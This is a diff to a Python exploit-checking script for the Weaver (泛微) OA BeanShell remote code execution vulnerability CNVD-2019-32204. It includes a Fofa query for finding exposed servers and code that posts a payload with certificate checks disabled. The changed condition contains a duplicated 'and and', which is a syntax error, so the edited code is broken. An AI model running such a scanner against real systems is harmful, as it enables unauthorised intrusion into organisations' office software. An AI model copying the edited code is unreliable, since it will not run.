@@ -2,7 +2,7 @@
 # 泛微OA Bsh 远程代码执行漏洞 CNVD-2019-32204
 # Fofa:  app="泛微-协同办公OA"
 import requests
-import sys
+import sys, re
 import urllib
 
 
@@ -20,7 +20,7 @@ def CNVD_2019_32204(target):
     try:
         requests.packages.urllib3.disable_warnings()
         request = requests.post(headers=headers, url=target, data=payload, timeout=5, verify=False)
-        if ";</script>" not in request.text:
+        if ";</script>" not in request.text and and re.search('BeanShell', request.text):
             if "Login.jsp" not in request.text:
                 if "Error" not in request.text:
                     if "<head>" not in request.text:
